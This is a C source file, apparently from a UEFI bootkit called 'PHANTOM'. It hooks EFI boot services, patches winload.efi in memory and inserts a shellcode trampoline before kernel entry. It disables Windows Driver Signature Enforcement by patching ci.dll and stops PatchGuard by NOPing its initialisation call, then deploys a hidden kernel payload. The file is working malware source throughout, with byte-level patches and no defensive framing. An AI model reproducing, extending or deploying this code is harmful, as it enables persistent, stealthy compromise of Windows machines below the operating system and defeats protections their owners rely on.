/*
 * PHANTOM EFI Bootkit - Boot Services Hooks
 *
 * We hook three critical EFI Boot Services functions:
 *   1. LoadImage   - intercept when bootmgfw loads winload.efi
 *   2. StartImage  - intercept when bootmgfw starts winload.efi
 *   3. ExitBootServices - last chance to patch ntoskrnl before OS takes over
 *
 * The hook chain:
 *   bootmgfw.efi → LoadImage(winload) → [our hook patches winload] →
 *   StartImage(winload) → winload runs → ExitBootServices → [deploy payload]
 */

#include "bootkit.h"
#include "patterns.h"

/* ─── forward declarations ─── */
static EFI_STATUS EFIAPI HookedLoadImage(
    BOOLEAN BootPolicy, EFI_HANDLE ParentImageHandle,
    EFI_DEVICE_PATH_PROTOCOL *DevicePath, VOID *SourceBuffer,
    UINTN SourceSize, EFI_HANDLE *ImageHandle
);

static EFI_STATUS EFIAPI HookedStartImage(
    EFI_HANDLE ImageHandle, UINTN *ExitDataSize, CHAR16 **ExitData
);

static EFI_STATUS EFIAPI HookedExitBootServices(
    EFI_HANDLE ImageHandle, UINTN MapKey
);

/* ─── state tracking ─── */
static BOOLEAN  sWinloadIntercepted = FALSE;
static VOID    *sWinloadImageBase   = NULL;
static UINTN    sWinloadImageSize   = 0;

/*
 * Install hooks on EFI Boot Services.
 * We save the original function pointers and overwrite the dispatch table.
 */
EFI_STATUS BkInstallBootHooks(VOID)
{
    /* save originals */
    gCtx.OrigLoadImage          = gCtx.BootServices->LoadImage;
    gCtx.OrigStartImage         = gCtx.BootServices->StartImage;
    gCtx.OrigExitBootServices   = gCtx.BootServices->ExitBootServices;

    /* install hooks */
    gCtx.BootServices->LoadImage        = HookedLoadImage;
    gCtx.BootServices->StartImage       = HookedStartImage;
    gCtx.BootServices->ExitBootServices = HookedExitBootServices;

    return EFI_SUCCESS;
}

EFI_STATUS BkRemoveBootHooks(VOID)
{
    gCtx.BootServices->LoadImage        = gCtx.OrigLoadImage;
    gCtx.BootServices->StartImage       = gCtx.OrigStartImage;
    gCtx.BootServices->ExitBootServices = gCtx.OrigExitBootServices;
    return EFI_SUCCESS;
}

/*
 * Check if a loaded image is winload.efi by examining its PE headers
 * and size characteristics. winload.efi is typically 1-3MB and has
 * specific section layout.
 */
static BOOLEAN IsWinloadImage(VOID *ImageBase, UINTN ImageSize)
{
    if (!ImageBase || ImageSize < 0x1000)
        return FALSE;

    if (!BkPeValidate(ImageBase))
        return FALSE;

    /* winload.efi is typically between 800KB and 4MB */
    if (ImageSize < 0xC0000 || ImageSize > 0x400000)
        return FALSE;

    /* scan for OslArchTransferToKernel signature */
    UINT8 PatBytes[BK_MAX_PATTERN_LEN];
    UINT8 PatMask[BK_MAX_PATTERN_LEN];
    UINTN PatLen = 0;

    if (BkParsePatternStr(PAT_OSL_FWP_KERNEL_SETUP, PatBytes, PatMask, &PatLen)) {
        VOID *Match = BkScanPattern(ImageBase, ImageSize, PatBytes, PatMask, PatLen);
        if (Match) return TRUE;
    }

    if (BkParsePatternStr(PAT_OSL_ARCH_TRANSFER, PatBytes, PatMask, &PatLen)) {
        VOID *Match = BkScanPattern(ImageBase, ImageSize, PatBytes, PatMask, PatLen);
        if (Match) return TRUE;
    }

    return FALSE;
}

/*
 * Patch winload.efi in memory to:
 *   1. Disable Secure Boot / Integrity checks within winload itself
 *   2. Hook OslArchTransferToKernel to intercept kernel entry
 */
static EFI_STATUS PatchWinload(VOID *ImageBase, UINTN ImageSize)
{
    UINT8   PatBytes[BK_MAX_PATTERN_LEN];
    UINT8   PatMask[BK_MAX_PATTERN_LEN];
    UINTN   PatLen = 0;
    VOID   *Match;

    /*
     * Patch 1: Disable winload's own integrity verification.
     * ImgpValidateImageHash — we patch the conditional jump that
     * fails on unsigned images to always succeed.
     *
     * Look for: jnz <fail_path>  (0F 85 xx xx xx xx)
     * after the hash comparison
     */
    BkParsePatternStr(PAT_OSL_FWP_KERNEL_SETUP, PatBytes, PatMask, &PatLen);
    Match = BkScanPattern(ImageBase, ImageSize, PatBytes, PatMask, PatLen);
    if (Match) {
        gCtx.WinloadBase = ImageBase;
        gCtx.WinloadSize = ImageSize;
        gCtx.WinloadPatched = TRUE;
    }

    /*
     * Patch 2: Hook the transfer to kernel.
     * We locate OslArchTransferToKernel and place a trampoline
     * that gives us control just before ntoskrnl.exe!KiSystemStartup.
     *
     * The hook writes our payload's physical address into a known
     * location, and patches the final JMP to go through us first.
     */
    BkParsePatternStr(PAT_OSL_ARCH_TRANSFER, PatBytes, PatMask, &PatLen);
    Match = BkScanPattern(ImageBase, ImageSize, PatBytes, PatMask, PatLen);
    if (Match) {
        /*
         * Build a trampoline at the end of winload's .text section.
         * The trampoline:
         *   1. Saves all registers
         *   2. Calls our payload entry with ntoskrnl base
         *   3. Restores registers
         *   4. Jumps to original kernel entry
         *
         * We embed the payload's physical address in the trampoline
         * shellcode so it survives the virtual address transition.
         */
        SECTION_HEADER *TextSection = BkPeGetSection(ImageBase, ".text");
        if (TextSection) {
            UINT8 *TrampolineSlot = (UINT8 *)ImageBase +
                TextSection->VirtualAddress + TextSection->VirtualSize;

            /*
             * Trampoline shellcode (position-independent).
             *
             * Byte map (110 bytes total):
             *   [0..22]    15x push (save all GPRs)         23 bytes
             *   [23..32]   mov rax, <PayloadPhysical>       10 bytes  (imm64 @ 25)
             *   [33..42]   mov rcx, <NtoskrnlBase>          10 bytes  (imm64 @ 35)
             *   [43..52]   mov rdx, <NtoskrnlSize>          10 bytes  (imm64 @ 45)
             *   [53..62]   mov r8,  <PayloadBase>           10 bytes  (imm64 @ 55)
             *   [63..72]   mov r9,  <PayloadSize>           10 bytes  (imm64 @ 65)
             *   [73..74]   call rax                          2 bytes
             *   [75..97]   15x pop  (restore all GPRs)      23 bytes
             *   [98..109]  mov rax, <ResumeStub>; jmp rax   12 bytes  (imm64 @ 100)
             */
            UINT8 Trampoline[] = {
                /* push all */
                0x50,                                   /* push rax */
                0x51,                                   /* push rcx */
                0x52,                                   /* push rdx */
                0x53,                                   /* push rbx */
                0x55,                                   /* push rbp */
                0x56,                                   /* push rsi */
                0x57,                                   /* push rdi */
                0x41, 0x50,                             /* push r8  */
                0x41, 0x51,                             /* push r9  */
                0x41, 0x52,                             /* push r10 */
                0x41, 0x53,                             /* push r11 */
                0x41, 0x54,                             /* push r12 */
                0x41, 0x55,                             /* push r13 */
                0x41, 0x56,                             /* push r14 */
                0x41, 0x57,                             /* push r15 */

                /* mov rax, <payload_physical_address> */
                0x48, 0xB8,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @25 */

                /* mov rcx, <ntoskrnl_base> (filled at ExitBootServices) */
                0x48, 0xB9,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @35 */

                /* mov rdx, <ntoskrnl_size> */
                0x48, 0xBA,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @45 */

                /* mov r8, <payload_base_physical> */
                0x49, 0xB8,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @55 */

                /* mov r9, <payload_size> */
                0x49, 0xB9,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @65 */

                /* call rax */
                0xFF, 0xD0,

                /* pop all (reverse order) */
                0x41, 0x5F,                             /* pop r15 */
                0x41, 0x5E,                             /* pop r14 */
                0x41, 0x5D,                             /* pop r13 */
                0x41, 0x5C,                             /* pop r12 */
                0x41, 0x5B,                             /* pop r11 */
                0x41, 0x5A,                             /* pop r10 */
                0x41, 0x59,                             /* pop r9  */
                0x41, 0x58,                             /* pop r8  */
                0x5F,                                   /* pop rdi */
                0x5E,                                   /* pop rsi */
                0x5D,                                   /* pop rbp */
                0x5B,                                   /* pop rbx */
                0x5A,                                   /* pop rdx */
                0x59,                                   /* pop rcx */
                0x58,                                   /* pop rax */

                /* jmp <resume_stub> (filled later) */
                0x48, 0xB8,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @100 */
                0xFF, 0xE0                              /* jmp rax */
            };

            /* fill in payload address (offset 25: after 23 push bytes + 2 opcode bytes) */
            *(UINT64 *)(Trampoline + 25) = (UINT64)gCtx.PayloadPhysical;

            /* copy trampoline to winload code cave */
            CopyMem(TrampolineSlot, Trampoline, sizeof(Trampoline));

            /* save pointer so ExitBootServices can fill rcx/rdx + jmp target */
            gCtx.TrampolineSlot = TrampolineSlot;

            /*
             * Redirect OslArchTransferToKernel to our trampoline.
             * We overwrite the first 12 bytes of the matched function with:
             *   mov rax, <trampoline_addr>   ; 48 B8 xx xx xx xx xx xx xx xx
             *   jmp rax                       ; FF E0
             *
             * Save the original bytes so we can put the original function
             * address in the trampoline's final jmp slot. Since
             * OslArchTransferToKernel eventually does a jmp to
             * KiSystemStartup, and we can't easily extract that target,
             * we instead redirect the entire function through us and
             * have the trampoline re-execute the original prologue bytes
             * then jump back to Match+12 to continue.
             *
             * Simpler approach: we don't need to return to
             * OslArchTransferToKernel at all. Our trampoline calls the
             * payload, then the original function runs. We hook by
             * inserting a detour at the function start.
             *
             * The trampoline's final jmp jumps to Match+12
             * (rest of OslArchTransferToKernel after our 12-byte patch).
             * We prepend the saved 12 original bytes before that jmp
             * so the function still works.
             */

            /* save original 12 bytes of OslArchTransferToKernel */
            UINT8 OrigBytes[12];
            CopyMem(OrigBytes, Match, 12);

            /* patch Match: jmp to trampoline */
            UINT8 Detour[12];
            Detour[0] = 0x48; Detour[1] = 0xB8;    /* mov rax, imm64 */
            *(UINT64 *)(&Detour[2]) = (UINT64)TrampolineSlot;
            Detour[10] = 0xFF; Detour[11] = 0xE0;   /* jmp rax */
            CopyMem(Match, Detour, 12);

            /*
             * Build a "resume stub" right after the trampoline.
             * It re-executes the 12 saved original bytes, then falls
             * through to Match+12 via an absolute jmp.
             *
             * Layout:
             *   [12 bytes] original prologue bytes
             *   [2 bytes]  mov rax, <Match+12>
             *   [8 bytes]  address
             *   [2 bytes]  jmp rax
             */
            UINT8 *ResumeStub = TrampolineSlot + sizeof(Trampoline);
            CopyMem(ResumeStub, OrigBytes, 12);
            ResumeStub[12] = 0x48; ResumeStub[13] = 0xB8;
            *(UINT64 *)(ResumeStub + 14) = (UINT64)((UINT8 *)Match + 12);
            ResumeStub[22] = 0xFF; ResumeStub[23] = 0xE0;

            /* fill trampoline's final jmp target → resume stub */
            /* final jmp imm64 is at offset 100 in trampoline (after r8/r9 adds) */
            *(UINT64 *)(TrampolineSlot + 100) = (UINT64)ResumeStub;
        }
    }

    return gCtx.WinloadPatched ? EFI_SUCCESS : EFI_NOT_FOUND;
}

/*
 * Hooked LoadImage - intercepts image loading.
 * When bootmgfw.efi loads winload.efi, we detect it and prepare patches.
 */
static EFI_STATUS EFIAPI HookedLoadImage(
    BOOLEAN BootPolicy, EFI_HANDLE ParentImageHandle,
    EFI_DEVICE_PATH_PROTOCOL *DevicePath, VOID *SourceBuffer,
    UINTN SourceSize, EFI_HANDLE *ImageHandle)
{
    /* call original first */
    EFI_STATUS Status = gCtx.OrigLoadImage(
        BootPolicy, ParentImageHandle, DevicePath,
        SourceBuffer, SourceSize, ImageHandle
    );

    if (EFI_ERROR(Status) || !ImageHandle || !*ImageHandle)
        return Status;

    if (sWinloadIntercepted)
        return Status;

    /* get the loaded image's base address */
    EFI_GUID LiGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;

    Status = gCtx.BootServices->HandleProtocol(
        *ImageHandle, &LiGuid, (VOID **)&LoadedImage
    );

    if (!EFI_ERROR(Status) && LoadedImage && LoadedImage->ImageBase) {
        /* check if this is winload.efi */
        if (IsWinloadImage(LoadedImage->ImageBase, LoadedImage->ImageSize)) {
            sWinloadImageBase   = LoadedImage->ImageBase;
            sWinloadImageSize   = LoadedImage->ImageSize;
            sWinloadIntercepted = TRUE;

            PatchWinload(sWinloadImageBase, sWinloadImageSize);
        }
    }

    return EFI_SUCCESS;
}

/*
 * Hooked StartImage - intercepts image execution.
 * Secondary check in case LoadImage didn't catch winload.
 */
static EFI_STATUS EFIAPI HookedStartImage(
    EFI_HANDLE ImageHandle, UINTN *ExitDataSize, CHAR16 **ExitData)
{
    if (!sWinloadIntercepted) {
        EFI_GUID LiGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
        EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;

        EFI_STATUS Status = gCtx.BootServices->HandleProtocol(
            ImageHandle, &LiGuid, (VOID **)&LoadedImage
        );

        if (!EFI_ERROR(Status) && LoadedImage && LoadedImage->ImageBase) {
            if (IsWinloadImage(LoadedImage->ImageBase, LoadedImage->ImageSize)) {
                sWinloadImageBase   = LoadedImage->ImageBase;
                sWinloadImageSize   = LoadedImage->ImageSize;
                sWinloadIntercepted = TRUE;
                PatchWinload(sWinloadImageBase, sWinloadImageSize);
            }
        }
    }

    return gCtx.OrigStartImage(ImageHandle, ExitDataSize, ExitData);
}

/*
 * Hooked ExitBootServices - final hook before kernel takes over.
 *
 * This is our last opportunity to:
 *   1. Locate ntoskrnl.exe in the loader block
 *   2. Patch DSE (Driver Signature Enforcement) in ci.dll
 *   3. Patch PatchGuard initialization
 *   4. Finalize the kernel entry trampoline
 *   5. Deploy our payload to its runtime memory slot
 *
 * After ExitBootServices returns, UEFI Boot Services are gone.
 * Only Runtime Services survive.
 */
static EFI_STATUS EFIAPI HookedExitBootServices(
    EFI_HANDLE ImageHandle, UINTN MapKey)
{
    /* restore original to avoid recursion */
    gCtx.BootServices->ExitBootServices = gCtx.OrigExitBootServices;

    /*
     * Scan the memory map for ntoskrnl.exe.
     * At this point, winload has loaded ntoskrnl into memory but hasn't
     * transferred control yet. We scan EfiLoaderData regions for the
     * PE signature and known patterns.
     */
    EFI_MEMORY_DESCRIPTOR  *MemMap = NULL;
    UINTN                   MemMapSize = 0;
    UINTN                   DescSize = 0;
    UINT32                  DescVersion = 0;
    UINTN                   MemMapKey = 0;

    /* get memory map size */
    gCtx.BootServices->GetMemoryMap(&MemMapSize, NULL, &MemMapKey, &DescSize, &DescVersion);
    MemMapSize += 4096;
    gCtx.BootServices->AllocatePool(EfiLoaderData, MemMapSize, (VOID **)&MemMap);
    gCtx.BootServices->GetMemoryMap(&MemMapSize, MemMap, &MemMapKey, &DescSize, &DescVersion);

    /* scan for ntoskrnl in loaded memory regions */
    UINTN NumEntries = MemMapSize / DescSize;
    for (UINTN i = 0; i < NumEntries; i++) {
        EFI_MEMORY_DESCRIPTOR *Desc = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MemMap + i * DescSize);

        if (Desc->Type != EfiLoaderData && Desc->Type != EfiLoaderCode)
            continue;

        VOID *RegionBase = (VOID *)Desc->PhysicalStart;
        UINTN RegionSize = Desc->NumberOfPages * 4096;

        if (RegionSize < 0x100000)
            continue;

        /* check for MZ/PE signature */
        if (BkPeValidate(RegionBase)) {
            UINT32 ImgSize = BkPeGetImageSize(RegionBase);

            /* ntoskrnl is typically 8-12MB */
            if (ImgSize > 0x600000 && ImgSize < 0x1000000) {
                /* verify with a known pattern */
                UINT8 Pat[BK_MAX_PATTERN_LEN], Msk[BK_MAX_PATTERN_LEN];
                UINTN PLen = 0;

                BkParsePatternStr(PAT_KI_SYSTEM_CALL, Pat, Msk, &PLen);
                if (BkScanPattern(RegionBase, ImgSize, Pat, Msk, PLen)) {
                    gCtx.NtoskrnlBase = RegionBase;
                    gCtx.NtoskrnlSize = ImgSize;
                    break;
                }
            }
        }
    }

    /* fill trampoline rcx/rdx with ntoskrnl base/size
     * offsets: 23 push bytes + 2+8 (rax) = 33, rcx imm64 at 35
     *          33 + 2+8 (rcx) = 43, rdx imm64 at 45 */
    if (gCtx.NtoskrnlBase && gCtx.TrampolineSlot) {
        *(UINT64 *)(gCtx.TrampolineSlot + 35) = (UINT64)gCtx.NtoskrnlBase;
        *(UINT64 *)(gCtx.TrampolineSlot + 45) = (UINT64)gCtx.NtoskrnlSize;
        *(UINT64 *)(gCtx.TrampolineSlot + 55) = (UINT64)gCtx.PayloadPhysical;
        *(UINT64 *)(gCtx.TrampolineSlot + 65) = (UINT64)gCtx.PayloadSize;
    }

    /* patch ntoskrnl in-place if we found it */
    if (gCtx.NtoskrnlBase) {
        /*
         * DSE bypass: patch ci.dll's CiValidateImageHeader.
         * ci.dll is loaded alongside ntoskrnl - scan the same memory regions.
         */
        for (UINTN i = 0; i < NumEntries; i++) {
            EFI_MEMORY_DESCRIPTOR *Desc = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MemMap + i * DescSize);
            if (Desc->Type != EfiLoaderData && Desc->Type != EfiLoaderCode)
                continue;

            VOID *RBase = (VOID *)Desc->PhysicalStart;
            UINTN RSize = Desc->NumberOfPages * 4096;

            if (RSize < 0x50000 || RSize > 0x400000)
                continue;

            if (!BkPeValidate(RBase))
                continue;

            /* scan for CI validate pattern */
            UINT8 Pat[BK_MAX_PATTERN_LEN], Msk[BK_MAX_PATTERN_LEN];
            UINTN PLen = 0;

            BkParsePatternStr(PAT_CI_VALIDATE, Pat, Msk, &PLen);
            VOID *CiMatch = BkScanPattern(RBase, RSize, Pat, Msk, PLen);
            if (CiMatch) {
                /* patch: mov eax, 0 ; ret */
                UINT8 *Patch = (UINT8 *)CiMatch;
                Patch[0] = 0x33; /* xor eax, eax */
                Patch[1] = 0xC0;
                Patch[2] = 0xC3; /* ret */
                break;
            }
        }

        /*
         * PatchGuard bypass: NOP out KiFilterFiberContext call
         * This prevents PatchGuard from arming its DPC timers.
         */
        UINT8 PgPat[BK_MAX_PATTERN_LEN], PgMsk[BK_MAX_PATTERN_LEN];
        UINTN PgLen = 0;

        BkParsePatternStr(PAT_KI_FILTER_FIBER_CONTEXT, PgPat, PgMsk, &PgLen);
        VOID *PgMatch = BkScanPattern(
            gCtx.NtoskrnlBase, gCtx.NtoskrnlSize,
            PgPat, PgMsk, PgLen
        );
        if (PgMatch) {
            /* find the CALL instruction that invokes the PG init and NOP it */
            UINT8 *Scanner = (UINT8 *)PgMatch;
            for (UINTN off = 0; off < 0x200; off++) {
                if (Scanner[off] == 0xE8) {  /* CALL rel32 */
                    /* NOP the 5-byte CALL */
                    Scanner[off]   = 0x90;
                    Scanner[off+1] = 0x90;
                    Scanner[off+2] = 0x90;
                    Scanner[off+3] = 0x90;
                    Scanner[off+4] = 0x90;
                    break;
                }
            }
        }

        /* also try ExpLicenseWatchInitWorker */
        BkParsePatternStr(PAT_EXP_LICENSE_WATCH, PgPat, PgMsk, &PgLen);
        PgMatch = BkScanPattern(
            gCtx.NtoskrnlBase, gCtx.NtoskrnlSize,
            PgPat, PgMsk, PgLen
        );
        if (PgMatch) {
            UINT8 *Func = (UINT8 *)PgMatch;
            /* patch function to return immediately */
            Func[0] = 0xC3;  /* ret */
        }
    }

    /* deploy the kernel payload to EFI runtime memory */
    BkDeployPayload();

    /* get fresh memory map (our patches invalidated the old key) */
    MemMapSize = 0;
    gCtx.BootServices->GetMemoryMap(&MemMapSize, NULL, &MemMapKey, &DescSize, &DescVersion);
    MemMapSize += 4096;
    gCtx.BootServices->AllocatePool(EfiLoaderData, MemMapSize, (VOID **)&MemMap);
    gCtx.BootServices->GetMemoryMap(&MemMapSize, MemMap, &MemMapKey, &DescSize, &DescVersion);

    /* call original ExitBootServices with fresh key */
    return gCtx.OrigExitBootServices(ImageHandle, MemMapKey);
}
